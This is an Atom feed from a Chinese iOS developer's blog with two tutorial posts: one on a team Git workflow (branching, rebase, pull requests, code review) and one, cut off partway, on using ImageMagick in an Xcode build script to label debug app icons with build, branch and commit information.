<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>小鱼周凌宇のCODE_HOME</title>
  <subtitle>技术宅 iOS开发 JAVA开发 萌妹子</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://zhoulingyu.com/"/>
  <updated>2017-05-15T02:48:26.475Z</updated>
  <id>http://zhoulingyu.com/</id>
  
  <author>
    <name>小鱼周凌宇</name>
    <email>coderfish@163.com</email>
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>简介我的 Git Work Flow</title>
    <link href="http://zhoulingyu.com/2017/05/08/Git-Work-Flow/"/>
    <id>http://zhoulingyu.com/2017/05/08/Git-Work-Flow/</id>
    <published>2017-05-08T15:31:46.000Z</published>
    <updated>2017-05-15T02:48:26.475Z</updated>
    
    <content type="html"><![CDATA[<h1 id="重要性"><a href="#重要性" class="headerlink" title="重要性"></a>重要性</h1><p>我们从重要性说起。</p>
<p>团队开发中要重视有洁癖的人，这种人往往对糟糕的工作流不断提出意见、对 Git 的使用方式提出要求。如果你的团队中这种人正在不断的被忽视，那么你的团队一定出现了管理混乱、代码质量不高等等等等问题。</p>
<p>统一的工作流程是至关重要的，不管对于哪一个行业的作业来说都一样。对于我们开发人员，工作流包含了开发时 Git 的使用规范、Repo 管理的规范、测试过程的规范、设计交互的管理规范等等。由于测试、交互等设计到更多的人员，本篇文章暂且不表，重点说 Git 的使用规范和 repo 管理的规范。</p>
<p>本篇文章将讲述我在工作中一直使用的 Work Flow，希望对大家有帮助。</p>
<a id="more"></a>
<h1 id="常见-Git-使用规范"><a href="#常见-Git-使用规范" class="headerlink" title="常见 Git 使用规范"></a>常见 Git 使用规范</h1><p>先举一个例子，放上几张 Network 的图形截图。为了你的工程不变成下面这个样子，请善待 Git 的使用：</p>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_work-flow-01.png-w375" alt="示例1"></p>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_work-flow-02.png-w375" alt="示例2"></p>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_work-flow-03.png-w375" alt="示例3"></p>
<p>这样一个乱糟糟的 Git，你们能忍我不能忍。</p>
<p>先来说说几张图种的问题：</p>
<ol>
<li>反向拉取 <code>develop</code> 分支</li>
<li>不经过 <code>Pull Request</code> 的合并</li>
<li>重复使用已经合并的分支</li>
<li>没有意义的 <code>Commit Message</code></li>
</ol>
<p><strong>对于问题 1</strong>，敢问这位同学，能不能用 <code>rebase</code>？很多同学在开发分支过程中，发现 <code>develop</code> 有更新，就去拉取 <code>develop</code> 的内容 Merge 进自己当前分支。对于 <code>rebase</code> 和 <code>merge</code>，请参考 <a href="https://github.com/geeeeeeeeek/git-recipes/wiki/5.1-%E4%BB%A3%E7%A0%81%E5%90%88%E5%B9%B6%EF%BC%9AMerge%E3%80%81Rebase%E7%9A%84%E9%80%89%E6%8B%A9" target="_blank" rel="external">这篇文章</a> 。引用里面的话：</p>
<blockquote>
<p>每次合并上游更改时 <code>feature</code> 分支都会引入一个外来的合并提交。如果 <code>develop</code> 非常活跃的话，这或多或少会污染你的分支历史。虽然高级的 <code>git log</code> 选项可以减轻这个问题，但对于开发者来说，<strong>还是会增加理解项目历史的难度。</strong></p>
</blockquote>
<p><strong>对于问题 2</strong>，完全就是习惯问题，对于所有的合并，如果是你自己的两个分支之间，如果非要直接 Merge 也不是不可，但是如果是两个人分别开发的分支，直接的 Merge 是不负责任的。<code>Pull Request</code> 或者 <code>Merge Request</code> 可以更早的帮你发现合并冲突，并且<strong>强制你 review 代码</strong>，这在保证代码质量方面起着至关重要的作用。</p>
<p><strong>对于问题 3</strong>，已经合并入 <code>develop</code> 分支的分支，最好在 <code>Pull Request</code> 合并时直接勾选移除原分支，更容易保持和 <code>develop</code> 的同步。</p>
<p><strong>对于问题 4</strong>，是最最最常见的问题，看看自己的项目，里面有多少个连续的 <code>Commit Message</code> 是『bug fix』、『update』、『pod add』、『修复』等等这样完全看不出啥内容的描述。敢问这样写的同学，你们的项目 Owner 看到 <code>Network</code> 时候是不是心里充满了 WTF？<code>Commit Message</code> 应当简短干练的描述这个 <code>commit</code> 做了什么。</p>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_work-flow-17.jpeg" alt=""></p>
<p>下面再看一个正面的示例，无比清爽的 Network：</p>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_work-flow-04.png-w375" alt="示例3"></p>
<p>关于我的 Work Flow，我们从基本的 Git 开发流接着介绍。</p>
<h2 id="Git-Flow"><a href="#Git-Flow" class="headerlink" title="Git Flow"></a>Git Flow</h2><p>广为人知的 Git Flow 定义了一套标准的 Git 开发流。<a href="http://nvie.com/posts/a-successful-git-branching-model/" target="_blank" rel="external">这里是经典文章</a>。</p>
<p>大致的意思为：</p>
<ol>
<li><code>master</code> 是长期分支，一般用于管理对外发布版本，每个 commit 对一个 tag，也就是一个发布版本</li>
<li><code>develop</code> 是长期分支，一般用于作为日常开发汇总，即开发版的代码</li>
<li><code>feature</code> 是短期分支，一般用于一个新功能的开发</li>
<li><code>hotfix</code> 是短期分支 ，一般用于正式发布以后，出现 bug，需要创建一个分支，进行 bug 修补。</li>
<li><code>release</code> 是短期分支，一般用于发布正式版本之前（即合并到 <code>master</code> 分支之前），需要有的预发布的版本进行测试。<code>release</code> 分支在经历测试之后，测试确认验收，将会被合并的 <code>develop</code> 和 <code>master</code></li>
</ol>
<p>具体的也可以参考 <a href="http://www.ruanyifeng.com/blog/2015/12/git-workflow.html" target="_blank" rel="external">Git 工作流程</a>。</p>
<h2 id="Github-Flow"><a href="#Github-Flow" class="headerlink" title="Github Flow"></a>Github Flow</h2><p>在开发中 Git 往往搭配持续交付平台，Github 也好，GitLab 也好，都提供了完备的持续交付管理功能。配合这些就有了 <a href="https://guides.github.com/introduction/flow/index.html" target="_blank" rel="external">Github Flow</a></p>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_work-flow-05.png" alt="Github Flow"></p>
<p>大致意思为：</p>
<ol>
<li><code>master</code> 开出新分支，不区分功能分支或补丁分支。</li>
<li>新分支开发完成后，或者需要讨论的时候，就向 <code>master</code> 发起一个 <code>Pull Request</code>。</li>
<li>项目内人一起评审和讨论你的代码。对话过程中，你还可以不断提交代码。</li>
<li><code>Pull Request</code> 通过，合并进 <code>master</code>，原分支就被删除。</li>
</ol>
<p>可以看出 Github Flow 是 Git Flow 的简化版本，但是加上了一些合作关节的把控。</p>
<h1 id="我的-Git-Work-Flow"><a href="#我的-Git-Work-Flow" class="headerlink" title="我的 Git Work Flow"></a>我的 Git Work Flow</h1><p>我通常希望团队中的开发流程类似 Git Flow，但更为详细，大致为：</p>
<h2 id="一、Git-分支部分"><a href="#一、Git-分支部分" class="headerlink" title="一、Git 分支部分"></a>一、Git 分支部分</h2><h3 id="master"><a href="#master" class="headerlink" title="master"></a>master</h3><p>长期分支，每个 <code>commit</code> 对一个 <code>tag</code>（一个发布版本）</p>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_work-flow-06.png-w375" alt="master"></p>
<h3 id="develop"><a href="#develop" class="headerlink" title="develop"></a>develop</h3><p>长期分支，日常开发汇总（开发版的代码）。</p>
<p>开发一个新的 feature 直接新在 <code>develop</code> 新开一个临时的 <code>feature</code> 分支，开发完成向 <code>develop</code> 提 <code>Pull Request``Pull Request</code>。</p>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_work-flow-07.png-w375" alt="develop"></p>
<h3 id="release"><a href="#release" class="headerlink" title="release"></a><code>release</code></h3><p>短期分支，feature 开发完成后从 <code>develop</code> 拉出的分支，用于测试阶段，期间添加的 <code>commit</code> 基本都是 bug fix，开发结束后同时和并进 <code>develop</code> 和 <code>master</code>，<code>master</code> 打上发布 tag。</p>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_work-flow-08.png-w375" alt="release"></p>
<h3 id="hotfix"><a href="#hotfix" class="headerlink" title="hotfix"></a><code>hotfix</code></h3><p>短期分支，正式发布以后，进行 bug 修补</p>
<h2 id="二、Git-操作部分"><a href="#二、Git-操作部分" class="headerlink" title="二、Git 操作部分"></a>二、Git 操作部分</h2><h3 id="commit-规范"><a href="#commit-规范" class="headerlink" title="commit 规范"></a>commit 规范</h3><ol>
<li><code>commit message</code> 言简意赅，不要写无用信息。不要出现 『update』，『Bug Fix』，这样让别人不能领其意的描述</li>
<li>添加一个新的 <code>Pod</code> 库或 <code>pod update</code> 后，单独提交一个 <code>commit</code>，统一 <code>commit message</code> 为『pod add xxx』或 『pod update』</li>
<li><code>commit</code> 之间保持独立，不要有修改同一个文件的情况。比如一个 <code>Pull Request</code> 中 commit1 在 FileA 中改了一个变量名， commit2 改回了变量名。原因是：<strong>审核代码时，审核人通常会逐个 <code>commit</code>查看，而不是直接看 <code>Changes</code>（可以直接忽略掉 pod update 这样的 <code>commit</code> 不看）</strong></li>
</ol>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_work-flow-09.png" alt=""></p>
<h3 id="rebase"><a href="#rebase" class="headerlink" title="rebase"></a>rebase</h3><p><strong>不要出现反向拉取代码</strong>的情况，即文章开头第一张、第二张图片中的情况——看到 <code>develop</code> 有更新，就将 <code>develop</code> 的代码拉取 merge 进自己的分支。</p>
<p>原因是：</p>
<ol>
<li><code>merge</code> 会导致你的分支都会引入一个外来的合并提交。如果 <code>develop</code> 非常活跃的话，或多或少会污染你的分支。</li>
<li>丑，Network 复杂，增加理解项目历史的难度。</li>
</ol>
<p>如何解决当前 <code>develop</code> 有更新的情况？</p>
<p><strong>请使用 <code>rebase</code>！</strong></p>
<p><code>rebase</code> 用中文直译就是 <code>变基</code>。上张图帮助大家理解：</p>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_work-flow-10.png" alt="rebase"></p>
<p><code>rebase</code> 在进行时，需要选择一个 <code>commit</code> 点，将当前分支从根基整个移到指定 <code>commit</code> 点，名副其实——<code>变基</code>。</p>
<p>这样你既可以得到一个好看的 <code>Network</code>，又可以及时控制冲突。不过在多人开发中你需要多多关注 <code>develop</code> 的情况，及时 <code>rebase</code>，避免长时间不更新代码突然 <code>rebase</code> 到最新后发现了大量冲突。当然，控制和分配比较好的项目本身也很少产生冲突。</p>
<h2 id="三、GitLab-管理规范"><a href="#三、GitLab-管理规范" class="headerlink" title="三、GitLab 管理规范"></a>三、GitLab 管理规范</h2><h3 id="issue"><a href="#issue" class="headerlink" title="issue"></a>issue</h3><p>日常 Github 玩的转的同学都知道 <code>issue</code> 可以做很多事，比如：意见管理、Bug 管理、任务管理，可以只做一种功能，也能通过不同的 Label 同时使用所有的功能。</p>
<p>我的 Work Flow 中，<code>issue</code> 用来做任务管理，因为 <code>issue</code> 可以方便的指派，及时收到邮件通知。</p>
<p>每次新版本迭代开始，PRD 审核通过时，组内协商好任务分配后将任务拆成最小单元，由 Owner 分别建立 issue，大家自行领取。</p>
<p>如果有开发过程中发现的需要改进的地方，同样可以建立 issue。</p>
<p>关于 Label，我通常会分为：<code>optimizing</code>、<code>bug fix</code>、<code>feature</code></p>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_work-flow-11.png" alt="issue 管理任务"></p>
<p>一个任务完成时，通常会提 <code>Pull Request</code>，如果该 <code>Pull Request</code> 中完成了所有的任务，<code>Pull Request</code> 的 Title 应当类似以下格式：</p>
<blockquote>
<p>『close #13 首页滚动栏切换效果完善』</p>
</blockquote>
<p>GitLab 和 Github 都能识别 <code>close #{issue id}</code>，如果在 Title 中这样写，在 <code>Pull Request</code> 通过审核时，相应的 issue 会自动被关闭。</p>
<h3 id="Milestones"><a href="#Milestones" class="headerlink" title="Milestones"></a>Milestones</h3><p><code>Milestones</code> 即里程碑，<code>issue</code> 在建立的时候可以选择 <code>Milestones</code>，如果合理的使用了 <code>Milestones</code>，在 Milestones 页面，就可以得到一个清晰的项目进度。</p>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_work-flow-12.png" alt="Milestones 页面"></p>
<h3 id="Pull-Request"><a href="#Pull-Request" class="headerlink" title="Pull Request"></a>Pull Request</h3><p>所有的合并都需要提 <code>Pull Request</code>，包括自己的分支合并到自己的分支，可以更好的帮助大家养成 Code Review 的好习惯。</p>
<p><code>Pull Request</code> 的标题应该简介的介绍该次合并所做的事。更详细的内容应当在 <code>Description</code> 中逐条列出。如有相关文档链接也应列出。</p>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_work-flow-13.png" alt="Milestones 页面"></p>
<p>注意选择合适的 <code>Milestone</code> 和 <code>Labels</code>。选择一位 Assignee 来审核，如果觉得该 <code>Pull Request</code> 内容过多，或有需要大家共同讨论的地方，再 <code>Pull Request</code> 提交后，在 <code>Discussion</code> 区域 <code>@</code> 其他人，所有人都会及时收到邮件。</p>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_work-flow-14.png" alt="Milestones 页面"></p>
<h3 id="Code-Review"><a href="#Code-Review" class="headerlink" title="Code Review"></a>Code Review</h3><p><code>Code Review</code> 是一个很值得说的点。很多时候大家会以为 <code>Code Review</code> 是一定要读懂别人的代码，然后进行分析、审核。其实 <code>Code Review</code> 更多的是扮演了团队内经验传递的作用。</p>
<p>举个例子，代码规范这样的东西，就算是一个团队有了很详细的文档，但大家也不一定会去完整记下。对于新人，完成了 feature 后提 <code>Pull Request</code>，交由其他人 <code>Code Review</code> 时，由其他人审核代码规范，不合规要求继续修正，来回四五次，就再基本不会有问题了。</p>
<p>这也是我的亲身经历，我之前的一位 leader 对于 Work Flow 管理非常有经验，我在最初时提了几次 <code>Pull Request</code>，很快就熟悉了团队内的代码规范。</p>
<p>所以 <code>Code Review</code> 审核人应当检查的内容不是硬性的，但至少应当包括：</p>
<ol>
<li>代码规范</li>
<li>基本语法和基本逻辑错误</li>
<li>业务逻辑的一些经验</li>
<li>…</li>
</ol>
<p>在发现错误时，应当及时的添加 <code>comment</code>。</p>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_work-flow-15.png" alt="Milestones 页面"></p>
<p>当审核人全部审核完毕，添加完所有的 <code>comment</code> 之后需要在 <code>Discussion</code> 区域 <code>@提交人 review done</code>，通知提交人。</p>
<p>同样，提交人在按照 <code>comment</code> 修改完后，也应当在 <code>Discussion</code> 区域 <code>@相关审核人 修改完成，请重新审核</code>。</p>
<p>需要着重说明的是：提交人的<strong>所有修改，不允许新提交 <code>commit</code></strong>，应当在本地修改完成后，<code>ammend</code> 追加到最后 <code>commit</code>。</p>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_work-flow-16.png" alt="Milestones 页面"></p>
<p>但是这一点，只是我一直使用的方式，原因同样是遵循『<code>commit</code> 之间保持独立』，如果提交新的 <code>commit</code> 导致两个 <code>commit</code> 修改了同一个文件。</p>
<p>当然也有人认为新加 <code>commit</code> 可以更清晰的看到提交者的新变动，也更符合 <code>Github Flow</code>。关于这里，就没有什么强制了，更喜欢什么就什么。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>最后，希望大家都收获一个清爽如风的 Network。</p>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_work-flow-04.png-w375" alt="示例3"></p>
<hr>
<p>有什么问题都可以在博文后面留言，或者微博上私信我，或者邮件我 <a href="&#109;&#x61;&#x69;&#x6c;&#x74;&#111;&#58;&#x63;&#111;&#x64;&#101;&#x72;&#x66;&#105;&#115;&#104;&#x40;&#49;&#54;&#x33;&#x2e;&#99;&#111;&#109;">&#x63;&#111;&#x64;&#101;&#x72;&#x66;&#105;&#115;&#104;&#x40;&#49;&#54;&#x33;&#x2e;&#99;&#111;&#109;</a>。</p>
<p>博主是 iOS 妹子一枚。</p>
<p>希望大家一起进步。</p>
<p>我的微博：<a href="http://weibo.com/coderfish/" target="_blank" rel="external">小鱼周凌宇</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;重要性&quot;&gt;&lt;a href=&quot;#重要性&quot; class=&quot;headerlink&quot; title=&quot;重要性&quot;&gt;&lt;/a&gt;重要性&lt;/h1&gt;&lt;p&gt;我们从重要性说起。&lt;/p&gt;
&lt;p&gt;团队开发中要重视有洁癖的人，这种人往往对糟糕的工作流不断提出意见、对 Git 的使用方式提出要求。如果你的团队中这种人正在不断的被忽视，那么你的团队一定出现了管理混乱、代码质量不高等等等等问题。&lt;/p&gt;
&lt;p&gt;统一的工作流程是至关重要的，不管对于哪一个行业的作业来说都一样。对于我们开发人员，工作流包含了开发时 Git 的使用规范、Repo 管理的规范、测试过程的规范、设计交互的管理规范等等。由于测试、交互等设计到更多的人员，本篇文章暂且不表，重点说 Git 的使用规范和 repo 管理的规范。&lt;/p&gt;
&lt;p&gt;本篇文章将讲述我在工作中一直使用的 Work Flow，希望对大家有帮助。&lt;/p&gt;
    
    </summary>
    
      <category term="iOS" scheme="http://zhoulingyu.com/categories/iOS/"/>
    
    
      <category term="iOS" scheme="http://zhoulingyu.com/tags/iOS/"/>
    
      <category term="git" scheme="http://zhoulingyu.com/tags/git/"/>
    
  </entry>
  
  <entry>
    <title>iOS——写一个快速定位问题的脚本</title>
    <link href="http://zhoulingyu.com/2017/04/04/iOS%E2%80%94%E2%80%94%E5%86%99%E4%B8%80%E4%B8%AA%E5%BF%AB%E9%80%9F%E5%AE%9A%E4%BD%8D%E9%97%AE%E9%A2%98%E7%9A%84%E8%84%9A%E6%9C%AC/"/>
    <id>http://zhoulingyu.com/2017/04/04/iOS——写一个快速定位问题的脚本/</id>
    <published>2017-04-04T11:15:38.000Z</published>
    <updated>2017-05-15T02:48:26.479Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_iOS%E2%80%94%E2%80%94%E5%86%99%E4%B8%80%E4%B8%AA%E5%BF%AB%E9%80%9F%E5%AE%9A%E4%BD%8D%E9%97%AE%E9%A2%98%E7%9A%84%E8%84%9A%E6%9C%AC-12.png" alt=""></p>
<h1 id="你是否见过？"><a href="#你是否见过？" class="headerlink" title="你是否见过？"></a>你是否见过？</h1><ol>
<li>你是否见过测试人员或者自己在 CI 上 install 了一个版本，发现了 BUG 后，突然忘了自己下的是 CI 上的哪一个 commit 的包？</li>
<li>你是否见过下面这个东西：</li>
</ol>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_iOS%E2%80%94%E2%80%94%E5%86%99%E4%B8%80%E4%B8%AA%E5%BF%AB%E9%80%9F%E5%AE%9A%E4%BD%8D%E9%97%AE%E9%A2%98%E7%9A%84%E8%84%9A%E6%9C%AC-01.jpg" alt="blog_iOS——写一个快速定位问题的脚本-01"></p>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_iOS%E2%80%94%E2%80%94%E5%86%99%E4%B8%80%E4%B8%AA%E5%BF%AB%E9%80%9F%E5%AE%9A%E4%BD%8D%E9%97%AE%E9%A2%98%E7%9A%84%E8%84%9A%E6%9C%AC-02.png" alt="blog_iOS——写一个快速定位问题的脚本-02"></p>
<a id="more"></a>
<h1 id="写一个这样一个脚本"><a href="#写一个这样一个脚本" class="headerlink" title="写一个这样一个脚本"></a>写一个这样一个脚本</h1><p>可以写这样一个脚本，它能做到：</p>
<ol>
<li>在 Build 的过程中在 App Icon 的表面覆盖上 Build 号、分支名、commit version 的 hash 值</li>
<li>不影响原本的 App Icon 图标源文件</li>
<li>区分 <code>Release</code> 和 <code>Debug</code>，只在 <code>Debug</code> 环境下 Build 项目时执行脚本</li>
</ol>
<h1 id="Do-it"><a href="#Do-it" class="headerlink" title="Do it"></a>Do it</h1><h2 id="ImageMagick"><a href="#ImageMagick" class="headerlink" title="ImageMagick"></a>ImageMagick</h2><p>做后端的同学们，大多知道 <a href="http://www.imagemagick.org/script/index.php" target="_blank" rel="external">ImageMagick</a>。</p>
<blockquote>
<p>使用 ImageMagick 可以创建、编辑、合成或转换图片。它可以读和写各种格式的图像（超过 200 种格式）包括 PNG、JPEG、JPEG - 2000、GIF、TIFF、DPX、EXR、WebP、Postscript、PDF、SVG。ImageMagick 可以调整、翻转、镜像、旋转、扭曲、剪切和转换图像、图像色彩调整，适用于各种特殊效果,或绘制文本、线、多边形、椭圆和贝塞尔曲线。</p>
</blockquote>
<p>通过 shell command 就可以轻易使用以上功能。</p>
<hr>
<p>让我们来看一些基本的。这是我们准备好的 <code>120*120</code> 的原图：</p>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_iOS%E2%80%94%E2%80%94%E5%86%99%E4%B8%80%E4%B8%AA%E5%BF%AB%E9%80%9F%E5%AE%9A%E4%BD%8D%E9%97%AE%E9%A2%98%E7%9A%84%E8%84%9A%E6%9C%AC-03.png" alt="blog_iOS——写一个快速定位问题的脚本-03"></p>
<p><code>cd</code> 到图片所在的目录，执行以下命令，给图片添加高斯模糊效果：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">convert original.png -blur 10x8 blurred.png</div></pre></td></tr></table></figure>
<p>完成图：</p>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_iOS%E2%80%94%E2%80%94%E5%86%99%E4%B8%80%E4%B8%AA%E5%BF%AB%E9%80%9F%E5%AE%9A%E4%BD%8D%E9%97%AE%E9%A2%98%E7%9A%84%E8%84%9A%E6%9C%AC-04.png" alt="blog_iOS——写一个快速定位问题的脚本-04"></p>
<hr>
<p>继续，执行以下命令从 坐标 <code>(0,60)</code> 剪切成 <code>120*60</code> 的图片，</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">convert blurred.png -crop 120x60+0+60 cropped-blurred.png</div></pre></td></tr></table></figure>
<p>完成图：</p>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_iOS%E2%80%94%E2%80%94%E5%86%99%E4%B8%80%E4%B8%AA%E5%BF%AB%E9%80%9F%E5%AE%9A%E4%BD%8D%E9%97%AE%E9%A2%98%E7%9A%84%E8%84%9A%E6%9C%AC-05.png" alt="blog_iOS——写一个快速定位问题的脚本-05"></p>
<hr>
<p>继续，给图片添加文字水印『zhoulingyu』，参数包括：背景不填充颜色、白色字体、字体大小 12、居中显示文字、文字为『zhoulingyu』：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">convert -background none -fill white -pointsize 12 -gravity center caption:<span class="string">"zhoulingyu"</span> cropped-blurred.png +swap -composite label.png</div></pre></td></tr></table></figure>
<p>完成图：</p>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_iOS%E2%80%94%E2%80%94%E5%86%99%E4%B8%80%E4%B8%AA%E5%BF%AB%E9%80%9F%E5%AE%9A%E4%BD%8D%E9%97%AE%E9%A2%98%E7%9A%84%E8%84%9A%E6%9C%AC-06.png" alt="blog_iOS——写一个快速定位问题的脚本-06"></p>
<hr>
<p>继续，将上面得到的剪切好的带水印的 <code>label.png</code> 和 原图 <code>original.png</code> 合成在一起：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">composite label.png original.png finished-image.png</div></pre></td></tr></table></figure>
<p>完成图：</p>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_iOS%E2%80%94%E2%80%94%E5%86%99%E4%B8%80%E4%B8%AA%E5%BF%AB%E9%80%9F%E5%AE%9A%E4%BD%8D%E9%97%AE%E9%A2%98%E7%9A%84%E8%84%9A%E6%9C%AC-07.png" alt="blog_iOS——写一个快速定位问题的脚本-07"></p>
<p>OK，我们得到了想要的效果图。</p>
<h2 id="参数参考"><a href="#参数参考" class="headerlink" title="参数参考"></a>参数参考</h2><p>给出一些 ImageMagic 的常用用法：</p>
<ol>
<li>查看图片信息</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">identify original.png </div><div class="line">original.png PNG 120x120 120x120+0+0 8-bit sRGB 46c 2.58KB 0.010u 0:00.000</div></pre></td></tr></table></figure>
<ol>
<li>格式转换</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">convert original.png original.jpg</div></pre></td></tr></table></figure>
<ol>
<li>编辑图片大小</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">convert original.png -resize 200x200 resize-image.png</div></pre></td></tr></table></figure>
<ol>
<li>裁剪</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># 从坐标 (0,0) 裁剪 100*100 的图像</span></div><div class="line">convert original.png -crop 100x100+0+0 crop.png</div></pre></td></tr></table></figure>
<ol>
<li>旋转</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">convert original.png -rotate 45 rotate.png</div></pre></td></tr></table></figure>
<ol>
<li>合并图像</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># 给图片添加水印</span></div><div class="line">convert original.png -compose over watermark.png -composite new-image.png</div></pre></td></tr></table></figure>
<ol>
<li>高斯模糊</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">convert -blur 80x5 original.jpg blur.png</div></pre></td></tr></table></figure>
<p>-blur radiusxsigma，两个分别是高斯模糊需要的两个参数，具体可以查看 <a href="https://www.imagemagick.org/script/command-line-options.php#blur" target="_blank" rel="external">blur 参数使用</a></p>
<p>ImageMagick 可以实现 N 多效果，像油画、噪声、散射、旋涡，都不在话下。</p>
<p>除了基本的效果，还有一些比较常用的参数：</p>
<table>
<thead>
<tr>
<th>参数名</th>
<th>使用规范</th>
<th>说明</th>
<th>用例</th>
</tr>
</thead>
<tbody>
<tr>
<td>-background</td>
<td>-background color</td>
<td>设置背景色</td>
<td>-background white</td>
</tr>
<tr>
<td>-pointsize</td>
<td>-pointsize value</td>
<td>设置字体等大小</td>
<td>-pointsize 12</td>
</tr>
<tr>
<td>-gravity</td>
<td>-gravity type</td>
<td>为其他命令附加 gravity，比如设置文字添加位置居中。</td>
<td>-gravity Center</td>
</tr>
<tr>
<td>-geometry</td>
<td>-geometry geometry</td>
<td>设置即将处理图像的坐标位置</td>
<td>-geometry +0+60 -geometry Center</td>
</tr>
</tbody>
</table>
<p>当然这些都可以在 <a href="https://www.imagemagick.org/script/command-line-options.php" target="_blank" rel="external">官方文档</a> 找到。</p>
<h2 id="shell-脚本"><a href="#shell-脚本" class="headerlink" title="shell 脚本"></a>shell 脚本</h2><h3 id="1-基本设置"><a href="#1-基本设置" class="headerlink" title="1. 基本设置"></a>1. 基本设置</h3><p>知道 ImageMagic 如何使用，剩下来写脚本就思路清晰多了。</p>
<p>在工程 <code>Target</code> -&gt; <code>Build Phases</code> 中新建一个 Run Script，我们可以给它起名 <code>generate auxiliary icon</code>，这样稍后容易在 <code>Report Navigator</code> 观察。</p>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_iOS%E2%80%94%E2%80%94%E5%86%99%E4%B8%80%E4%B8%AA%E5%BF%AB%E9%80%9F%E5%AE%9A%E4%BD%8D%E9%97%AE%E9%A2%98%E7%9A%84%E8%84%9A%E6%9C%AC-08.png" alt="blog_iOS——写一个快速定位问题的脚本-08"></p>
<p>现在我们可以开始编写我们的脚本 <code>auxiliary_icon.sh</code></p>
<h3 id="2-理思路"><a href="#2-理思路" class="headerlink" title="2. 理思路"></a>2. 理思路</h3><p>写伪代码通常能够帮助我自己更清晰的写代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">// 1. 判断执行 Build 的机器是否安装了 ImageMagic</div><div class="line">//    |- 如果没有安装：提示安装，退出脚本</div><div class="line">//    |- 如果安装：继续执行</div><div class="line">// 2. 获取 commit 号 hash 值、分支名、build 号，并将其拼接成一个字符串</div><div class="line">// 3. 判断编译环境</div><div class="line">//    |- 如果是 Release 环境：提示当前是 Release 环境，退出脚本</div><div class="line">//    |- 如果是非 Release 环境：继续执行</div><div class="line">// 4. 获取 Plist 中 CFBundleIconFiles 的数量</div><div class="line">// 5. 根据数量循环，执行调用『生成记号图方法』</div><div class="line"></div><div class="line"></div><div class="line">// 『生成记号图方法』 </div><div class="line">// function generateIcon() &#123;</div><div class="line">// 1. 模糊图片</div><div class="line">// 2. 截取图片下半部分</div><div class="line">// 3. 添加 commit+brach+build 组成的字符串在截取图片上</div><div class="line">// 4. 合成截取图片和原图</div><div class="line">// 5. 清除多余图片</div><div class="line">// &#125;</div></pre></td></tr></table></figure>
<p>伪代码写好了，开始编写正式代码：</p>
<ol>
<li>判断执行 Build 的机器是否安装了 ImageMagic</li>
</ol>
<p>which 一下就知道</p>
